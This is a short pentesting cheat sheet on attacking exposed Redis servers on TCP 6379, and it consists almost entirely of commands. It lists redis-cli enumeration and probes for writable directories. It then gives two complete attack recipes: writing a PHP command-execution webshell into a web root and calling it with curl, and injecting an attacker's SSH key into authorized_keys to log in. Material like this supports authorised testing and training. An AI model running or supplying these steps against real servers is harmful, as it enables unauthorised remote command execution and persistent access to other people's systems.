+++
title = "🌐 Redis: TCP 6379"
+++

- `TCP 6379`: normal port

Redis is an in-memory key-value store used for caching, session management, and data persistence.

```bash
redis-cli -h <TARGET>

# Auth if password required
AUTH <PASSWORD>

CONFIG GET dir
CONFIG GET dbfilename
INFO
KEYS *
CONFIG GET *

# Check which DBs have keys
INFO keyspace
# Switch database (0-15 default)
SELECT <DB_NUMBER>
KEYS *

# Find writable dirs
CONFIG SET dir /root
CONFIG SET dir /tmp

CONFIG SET dir /var/lib/redis/.ssh

CONFIG SET dir /var/www/html
CONFIG SET dir /var/www
CONFIG SET dir /var/www/html/public
CONFIG SET dir /srv/http
CONFIG SET dir /usr/share/nginx/html

# Bruteforce web directories
CONFIG SET dir <WEBROOT>/upload
CONFIG SET dir <WEBROOT>/uploads  
CONFIG SET dir <WEBROOT>/images
```

## Webshell

- https://hackviser.com/tactics/pentesting/services/redis#webshell-upload-via-redis

```bash
# Webshell (if webroot writable)
flushall
set shell '<?php system($_REQUEST["cmd"]); ?>'
config set dbfilename shell.php
config set dir <WEBROOT>/<LOCATION>
save

curl -o- http://<TARGET>/<LOCATION>/shell.php?cmd=whoami
```

## SSH Key Injection

- https://hackviser.com/tactics/pentesting/services/redis#ssh-key-injection

```bash
# Attack box
ssh-keygen -t rsa -f redis_key -N ''

# Redis
CONFIG SET dir /var/lib/redis/.ssh
CONFIG SET dbfilename authorized_keys
SET key "\n\n<PUBLIC_KEY>\n\n"
BGSAVE

# SSH in
ssh -i redis_key redis@<TARGET>
```